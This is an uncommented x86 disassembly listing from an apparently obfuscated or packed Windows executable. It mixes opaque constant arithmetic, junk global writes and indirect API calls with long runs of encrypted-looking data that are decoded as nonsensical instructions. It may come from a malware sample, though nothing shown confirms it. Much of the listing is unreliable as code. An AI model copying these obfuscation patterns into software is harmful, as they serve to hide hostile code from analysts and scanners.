  41674f:	sub    BYTE PTR [edi-0x35],ch
  416752:	dec    esi
  416753:	mov    ebp,0x94626335
  416758:	loopne 0x416791
  41675a:	int    0xe0
  41675c:	pop    esp
  41675d:	jmp    0xac9c:0x102630
  416764:	loop   0x4167ac
  416766:	jb     0x416711
  416768:	stos   DWORD PTR es:[edi],eax
  416769:	daa    
  41676a:	shl    DWORD PTR [edi+0x55],1
  41676d:	call   0xbf99:0x5d93d786
  416774:	sbb    al,0x53
  416776:	jl     0x4167f6
  416778:	inc    edx
  416779:	inc    ebx
  41677a:	stos   DWORD PTR es:[edi],eax
  41677b:	bound  ecx,QWORD PTR [eax+0x458b1a04]
  416781:	enter  0x4503,0xc4
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422594
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422580
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428575,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428589,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x4284f5,0x96c
  416847:	cmp    DWORD PTR ds:0x428575,0x0
  41684e:	jbe    0x416866
  416854:	push   0x428167
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428585
  416866:	and    DWORD PTR ds:0x4284e9,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x428449
  416876:	sub    ecx,DWORD PTR ds:0x428521
  41687c:	mov    DWORD PTR ds:0x428449,ecx
  416882:	mov    ecx,DWORD PTR ds:0x422948
  416888:	and    DWORD PTR ds:0x428395,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428585,0x4284f9
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42847d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x428369,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x42843d,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428375,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42847d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42849d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x42843d
  4168f9:	movzx  eax,WORD PTR ds:0x428499
  416900:	cmp    DWORD PTR ds:0x42843d,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428599
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x428355,0x42843d
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428385,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x42856d,0x428589
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x428431,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428495
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42847d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428581,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x42842d,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x428465,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42837d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x42834d,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428371
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	sub    BYTE PTR [ebx-0x2bf322bc],dh
  416a33:	sar    BYTE PTR [esi-0x41413dcb],0xad
  416a3a:	lahf   
  416a3b:	aam    0x8a
  416a3d:	inc    ebp
  416a3e:	sar    DWORD PTR [ecx+0x9b2cf22],0xcc
  416a45:	xchg   ebx,eax
  416a46:	xor    DWORD PTR [edx-0x49aa0831],edi
  416a4c:	xlat   BYTE PTR ds:[ebx]
  416a4d:	cmp    ecx,DWORD PTR [eax+0x16]
  416a50:	push   es
  416a51:	fistp  DWORD PTR [esp+esi*1-0x7f]
  416a55:	cmc    
  416a56:	jle    0x416a6e
  416a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a59:	cmp    DWORD PTR [ebp-0x6e],ecx
  416a5c:	jp     0x416aa0
  416a5e:	stos   DWORD PTR es:[edi],eax
  416a5f:	out    dx,eax
  416a60:	pop    ecx
  416a61:	int3   
  416a62:	cld    
  416a63:	fwait
  416a64:	sub    cl,BYTE PTR [eax+0x7f77a99a]
  416a6a:	push   ss
  416a6b:	sub    eax,0x85c23d45
  416a70:	clc    
  416a71:	dec    edi
  416a72:	fdivrp st(7),st
  416a74:	int3   
  416a75:	sub    ch,BYTE PTR [eax+0x49]
  416a78:	mov    ah,0xbb
  416a7a:	add    BYTE PTR [edx-0x5b],dh
  416a7d:	xchg   ebx,eax
  416a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a7f:	int3   
  416a80:	jl     0x416a2a
  416a82:	cmp    ch,al
  416a84:	sub    edi,0xffffff82
  416a87:	sar    al,0x66
  416a8a:	repz and BYTE PTR [ecx+0x5e],0x40
  416a8f:	loop   0x416af1
  416a91:	lea    edx,[ecx-0x43]
  416a94:	mov    esi,ds
  416a96:	into   
  416a97:	jnp    0x416b10
  416a99:	push   eax
  416a9a:	and    BYTE PTR [ebp+ebx*1-0x7a8d263d],0x1b
  416aa2:	push   edx
  416aa3:	popf   
  416aa4:	cli    
  416aa5:	loop   0x416a7c
  416aa7:	xor    BYTE PTR [edx-0x2a12cd32],dl
  416aad:	out    0x8,al
  416aaf:	repnz aas 
  416ab1:	mov    dl,0x13
  416ab3:	sub    eax,0xa98c9689
  416ab8:	add    eax,0xffffffcf
  416abb:	pop    ebp
  416abc:	out    0x88,al
  416abe:	fs retf 0x2b8e
  416ac2:	dec    edx
  416ac3:	(bad)  
  416ac5:	shr    BYTE PTR [edi+0x77977ef],0x3
  416acc:	cdq    
  416acd:	bound  edi,QWORD PTR [ecx+0x7c64a4ed]
  416ad3:	xor    DWORD PTR [ebx-0x709025ec],ebx
  416ad9:	fisubr DWORD PTR [ebx-0x79]
  416adc:	inc    esi
  416add:	fdiv   st,st(0)
  416adf:	mov    dh,0x74
  416ae1:	fist   DWORD PTR [esi+0x20]
  416ae4:	(bad)  
  416ae5:	pop    ecx
  416ae6:	neg    esp
  416ae8:	dec    eax
  416ae9:	jmp    0xece8:0x5f426e53
  416af0:	sub    dh,ch
  416af2:	popf   
  416af3:	and    al,0x6b
  416af5:	jne    0x416a81
  416af7:	jmp    DWORD PTR [eax]
  416af9:	(bad)  
  416afa:	fcom   DWORD PTR [eax-0x7f13a20a]
  416b00:	bound  edx,QWORD PTR [ebp+esi*2+0x6f]
  416b04:	lahf   
  416b05:	fbld   TBYTE PTR [esi]
  416b07:	(bad)  
  416b08:	stos   BYTE PTR es:[edi],al
  416b09:	in     eax,0xdb
  416b0b:	jne    0x416b02
  416b0d:	lods   eax,DWORD PTR ds:[esi]
  416b0e:	ret    
  416b0f:	retf   0xb04
  416b12:	inc    ebp
  416b13:	add    BYTE PTR [esi+0x5f2c2d11],bl
  416b19:	cmp    al,0x1
  416b1b:	out    dx,al
  416b1c:	sub    al,0xc
  416b1e:	inc    esp
  416b1f:	(bad)  
  416b20:	cs nop
  416b22:	inc    ebp
  416b23:	pop    ss
  416b24:	dec    edx
  416b25:	(bad)  
  416b26:	adc    edx,edi
  416b28:	dec    esi
  416b29:	outs   dx,BYTE PTR ds:[esi]
  416b2b:	std    
  416b2c:	and    dl,BYTE PTR [eax+0x426f5c46]
  416b32:	test   DWORD PTR [ebx],edi
  416b34:	push   cs
  416b35:	jmp    0x70795280
  416b3a:	lahf   
  416b3b:	xor    eax,0x1c1e4f18
  416b40:	stos   DWORD PTR es:[edi],eax
  416b41:	ret    0xf23e
  416b44:	cmp    ebx,DWORD PTR [eax]
  416b46:	push   edi
  416b47:	(bad)  [ebx-0x7b]
  416b4a:	fcom   DWORD PTR [edi-0x5b002838]
  416b50:	out    0x20,al
  416b52:	xchg   ebp,eax
  416b53:	and    ch,dl
  416b55:	or     DWORD PTR [eax-0x18],edx
  416b58:	xor    DWORD PTR [ebx+0x23b7bedd],ebp
  416b5e:	or     DWORD PTR [eax+0x31],eax
  416b61:	ins    DWORD PTR es:[edi],dx
  416b62:	jmp    0x416bb4
  416b64:	loope  0x416ba9
  416b66:	fadd   QWORD PTR [ebx-0x70102830]
  416b6c:	adc    eax,0xbe378e42
  416b71:	and    edi,ebx
  416b73:	dec    ebp
  416b74:	mov    DWORD PTR [edx-0x480fcc40],eax
  416b7a:	pop    eax
  416b7b:	jnp    0x416b79
  416b7d:	pop    ebx
  416b7e:	jg     0x416b70
  416b80:	fldenv [ebx-0x5e]
  416b83:	cwde   
  416b84:	loopne 0x416bfc
  416b86:	out    dx,al
  416b87:	xchg   ebp,eax
  416b88:	cvtdq2ps xmm2,XMMWORD PTR [eax+0x13ea2489]
  416b8f:	ja     0x416b41
  416b91:	or     dh,BYTE PTR [edi-0x43de7532]
  416b97:	mov    ebx,0x37d6a21a
  416b9c:	out    0x9d,eax
  416b9e:	outs   dx,DWORD PTR ds:[esi]
  416b9f:	dec    esi
  416ba0:	popa   
  416ba1:	mov    eax,ds:0x5c5fefba
  416ba6:	mov    ebx,0xafeb88f9
  416bab:	push   es
  416bac:	cmp    DWORD PTR [eax-0x279e1715],esi
  416bb2:	stos   DWORD PTR es:[edi],eax
  416bb3:	push   ss
  416bb4:	jg     0x416c1e
  416bb6:	cs inc edx
  416bb8:	test   BYTE PTR [edx+0x6747f891],bl
  416bbe:	pop    eax
  416bbf:	mov    eax,0xe8238e33
  416bc4:	jne    0x416bcc
  416bc6:	rcl    BYTE PTR [eax-0x5b80596a],0x11
  416bcd:	call   0xf2a0e9c0
  416bd2:	(bad)  
  416bd3:	jmp    0x416bf7
  416bd5:	out    dx,al
  416bd6:	out    0xfb,eax
  416bd8:	loop   0x416bd2
  416bda:	jno    0x416c53
  416bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdd:	lock xor BYTE PTR [ecx-0x42],ch
  416be1:	dec    esp
  416be2:	mov    dh,0x35
  416be4:	icebp  
  416be5:	(bad)  
  416be6:	dec    edi
  416be7:	jo     0x416b8e
  416be9:	pop    es
  416bea:	sbb    BYTE PTR [eax],cl
  416bec:	fxch   st(5)
  416bee:	mov    al,0x5a
  416bf0:	push   0xea88a3d
  416bf5:	pushf  
  416bf6:	clc    
  416bf7:	sbb    dl,dl
  416bf9:	adc    eax,0x501c8efe
  416bfe:	popa   
  416bff:	fild   WORD PTR [edi]
  416c01:	pop    ebx
  416c02:	out    0xf9,eax
  416c04:	mov    bl,BYTE PTR [ebx+0xb0cac22]
  416c0a:	scas   al,BYTE PTR es:[edi]
  416c0b:	ret    0xb938
  416c0e:	les    edx,FWORD PTR [ebx]
  416c10:	push   edi
  416c11:	std    
  416c12:	mov    dh,bh
  416c14:	jmp    0x416bc5
  416c16:	pop    esi
  416c17:	jmp    0x9f5:0x97ff00bd
  416c1e:	jle    0x416bc1
  416c20:	adc    ah,BYTE PTR [esp+esi*4-0x3e]
  416c24:	int    0x38
  416c26:	xchg   esp,eax
  416c27:	sar    BYTE PTR [ecx+eax*2+0x13],0xc
  416c2c:	out    0x21,al
  416c2e:	out    0xec,al
  416c30:	shl    DWORD PTR [ebp+0x4e],1
  416c33:	test   eax,0xf6376f70
  416c38:	jo     0x416bd9
  416c3a:	adc    al,0x57
  416c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c3e:	xchg   ecx,eax
  416c3f:	jg     0x416ca7
  416c41:	add    ch,BYTE PTR [eax+0x31f1afba]
  416c47:	xor    ebx,DWORD PTR [edx-0x6a2bc237]
  416c4d:	or     eax,0xb510bc48
  416c52:	adc    DWORD PTR [eax],ecx
  416c54:	arpl   WORD PTR [edi-0x1e511b86],ax
  416c5a:	dec    edx
  416c5b:	push   esp
  416c5c:	pop    edx
  416c5d:	pop    esi
  416c5e:	sbb    eax,0x33984e
  416c63:	shl    esp,cl
  416c65:	loop   0x416ca7
  416c67:	inc    esp
  416c68:	int    0xcc
  416c6a:	ret    
  416c6b:	stos   DWORD PTR es:[edi],eax
  416c6c:	push   esi
  416c6d:	mov    edi,0xf71ebdd3
  416c72:	dec    ebp
  416c73:	scas   al,BYTE PTR es:[edi]
  416c74:	or     DWORD PTR [ebx-0x57],esi
  416c77:	mov    eax,ds:0x2444c7b4
  416c7c:	push   eax
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x428451
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x428459,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x428511,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x4284f5,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428379,0x0
  416d09:	mov    DWORD PTR ds:0x428361,edi
  416d0f:	mov    DWORD PTR ds:0x428465,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x42851d,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x428439,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428379,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428581,0x42838d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428385
  416d72:	adc    DWORD PTR ds:0x428459,ecx
  416d78:	cmp    DWORD PTR ds:0x428575,0x0
  416d7f:	mov    DWORD PTR ds:0x428599,edi
  416d85:	mov    DWORD PTR ds:0x428599,ebx
  416d8b:	mov    DWORD PTR ds:0x42842d,0x662b
  416d95:	mov    DWORD PTR ds:0x428581,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428375,ebx
  416daa:	cmp    DWORD PTR ds:0x428575,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x4281fb
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x428551
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42858d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428571
  416de1:	and    DWORD PTR ds:0x428481,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428379
  416df3:	add    DWORD PTR ds:0x42835d,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428389,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x4284a1,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428371,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x428451
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x42856d,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x428565
  416e57:	mov    ecx,DWORD PTR ds:0x4284a1
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428471,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x42856d,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x428431,edi
  416e87:	and    DWORD PTR ds:0x428391,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x428461
  416e97:	or     DWORD PTR ds:0x428595,ecx
  416e9d:	add    DWORD PTR ds:0x428501,ebx
  416ea3:	or     DWORD PTR ds:0x4284f1,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428385
  416eb3:	sub    DWORD PTR ds:0x4284e9,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428395,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x42842d,0x0
  416ecf:	mov    DWORD PTR ds:0x428351,0x5921
  416ed9:	mov    DWORD PTR ds:0x428501,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x42842d,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428371
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x4284f1,0x2a49
  416f10:	and    DWORD PTR ds:0x428581,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42847d
  416f21:	adc    DWORD PTR ds:0x428495,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x428565
  416f2d:	adc    DWORD PTR ds:0x428441,ecx
  416f33:	or     DWORD PTR ds:0x428381,0x75b4
  416f3d:	adc    DWORD PTR ds:0x4284e5,edx
  416f43:	or     DWORD PTR ds:0x42851d,0x469c
  416f4d:	or     DWORD PTR ds:0x428479,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428481,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x428441
  416f70:	or     ecx,DWORD PTR ds:0x428521
  416f76:	mov    DWORD PTR ds:0x428441,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428575,0x428571
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428395,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x428425,0x428465
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428571,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x428369,0x42834d
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x42834d,0x428385
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428479,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42838d,0x42834d
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x428445,0x428515
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x4284f1,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428471,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x4284f5,0x0
  417044:	not    DWORD PTR ds:0x428439
  41704a:	mov    DWORD PTR ds:0x4284fd,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42837d
  417060:	cmp    DWORD PTR ds:0x4284f5,0x0
  417067:	jae    0x41709b
  41706d:	push   0x4281d5
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x428359,edi
  417091:	xor    DWORD PTR ds:0x428479,0x58f
  41709b:	sbb    DWORD PTR ds:0x42848d,ecx
  4170a1:	sub    DWORD PTR ds:0x428581,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x4283fd
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x4285a1,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428481
  4170c0:	add    esi,DWORD PTR ds:0x428521
  4170c6:	mov    DWORD PTR ds:0x428481,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42838d,0x428461
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x417097
  417104:	xor    cl,BYTE PTR [esi-0x62]
  417107:	test   al,bl
  417109:	sar    BYTE PTR [esi-0x41413dcb],0xc0
  417110:	test   eax,0x17308905
  417115:	rol    ecx,0xeb
  417118:	popa   
  417119:	dec    ebp
  41711a:	out    dx,eax
  41711b:	out    0x5f,al
  41711d:	sbb    eax,0x9d1905e
  417122:	scas   eax,DWORD PTR es:[edi]
  417123:	add    al,0x9c
  417125:	(bad)  
  417126:	mul    DWORD PTR [edx-0x3353508d]
  41712c:	fst    QWORD PTR [ebp+0x1c4a3eb3]
  417132:	ds xchg ah,dl
  417135:	jo     0x4171a2
  417137:	mov    ebp,0x64ab5526
  41713c:	cmp    DWORD PTR [edx+0x39],edx
  41713f:	mov    ecx,0x351f88b9
  417144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417145:	jmp    0x896f:0xf5a3cf
  41714c:	cmovo  bp,WORD PTR [esi+ebx*8]
  417151:	into   
  417152:	xchg   edi,eax
  417153:	int    0xb
  417155:	xor    eax,0x758c95fb
  41715a:	in     al,0xac
  41715c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41715d:	sbb    al,0xe3
  41715f:	je     0x4171af
  417161:	imul   edx,DWORD PTR [esi+edx*8-0x3e],0xffffffed
  417166:	jo     0x41715c
  417168:	push   ss
  417169:	ins    DWORD PTR es:[edi],dx
  41716a:	jae    0x4171cb
  41716c:	test   ch,0x86
  41716f:	mov    ch,0x6d
  417171:	test   al,0xd8
  417173:	pop    ss
  417174:	clc    
  417175:	xchg   edx,eax
  417176:	mov    DWORD PTR [ecx+0x20f1f303],edi
  41717c:	xchg   ebx,eax
  41717d:	sub    edi,DWORD PTR [esi+0x1c]
  417180:	adc    DWORD PTR [ebx-0x3755f0ff],edx
  417186:	mov    ah,0xf5
  417188:	clc    
  417189:	dec    ebp
  41718a:	sbb    esi,DWORD PTR [edx]
  41718c:	ins    DWORD PTR es:[edi],dx
  41718d:	add    al,0x14
  41718f:	fs jle 0x417180
  417192:	add    DWORD PTR [esi+ebx*1],edx
  417195:	(bad)  
  417196:	mov    ds:0xea4870be,al
  41719b:	sbb    al,0x4d
  41719d:	les    edi,FWORD PTR [ebx]
  41719f:	fistp  DWORD PTR [esi-0x46]
  4171a2:	icebp  
  4171a3:	jne    0x417143
  4171a5:	in     eax,0xd3
  4171a7:	out    dx,eax
  4171a8:	push   ebx
  4171a9:	or     DWORD PTR [ecx+eax*8],eax
  4171ac:	call   0x61f65846
  4171b1:	cmp    BYTE PTR [eax],al
  4171b3:	lock jo 0x417203
  4171b6:	rcl    BYTE PTR [edi],cl
  4171b8:	jae    0x417193
  4171ba:	xchg   BYTE PTR [edx-0x3ef77057],cl
  4171c0:	dec    edi
  4171c1:	inc    esi
  4171c2:	stos   BYTE PTR es:[edi],al
  4171c3:	int    0xb4
  4171c5:	bound  eax,QWORD PTR ds:[ebp+0x43]
  4171c9:	mov    DWORD PTR [eax+0x20a092b],eax
  4171cf:	cdq    
  4171d0:	aam    0xe0
  4171d2:	pop    ebx
  4171d3:	ror    BYTE PTR [ebx+edx*1-0x46],1
  4171d7:	mov    ds:0xcaba73fd,eax
  4171dc:	arpl   WORD PTR [ebp-0x26],di
  4171df:	cmp    BYTE PTR [ecx],ch
  4171e1:	inc    esi
  4171e2:	cmp    dh,BYTE PTR [ecx]
  4171e4:	gs popf 
  4171e6:	mov    ds:0x2f7f8d95,al
  4171eb:	dec    esp
  4171ec:	repz js 0x4171cd
  4171ef:	sbb    ecx,ecx
  4171f1:	pop    edi
  4171f2:	push   edx
  4171f3:	cld    
  4171f4:	jnp    0x4171bf
  4171f6:	jnp    0x41718a
  4171f8:	scas   al,BYTE PTR es:[edi]
  4171f9:	aaa    
  4171fa:	xchg   edx,eax
  4171fb:	sahf   
  4171fc:	daa    
  4171fd:	pop    ebp
  4171fe:	in     al,0xcf
  417200:	add    eax,0xcb40c9d9
  417205:	aad    0xfa
  417207:	(bad)  
  417208:	ficomp DWORD PTR [ebp-0x41880ed5]
  41720e:	stc    
  41720f:	sub    BYTE PTR [ecx],ch
